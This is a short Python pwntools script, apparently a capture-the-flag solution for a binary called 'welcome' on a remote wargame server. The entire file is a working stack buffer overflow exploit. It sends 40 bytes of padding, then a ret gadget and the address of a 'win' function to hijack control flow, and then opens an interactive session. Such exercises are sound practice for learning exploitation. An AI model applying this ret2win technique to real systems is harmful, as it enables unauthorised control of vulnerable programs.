
from pwn import *

#gadgets
ret = p64(0x000000000040076c)
win = p64(0x0000000000400708)

#defines
PADDING = b'A' * 40

def main():
    ### run ###
    #p = process("./welcome")
    p = remote('pwnable.co.il', 9000)

    ### payload start ###
    payload = PADDING
    payload += ret
    payload += win

    p.sendline(payload)
    p.interactive()

if __name__ == "__main__":
    main()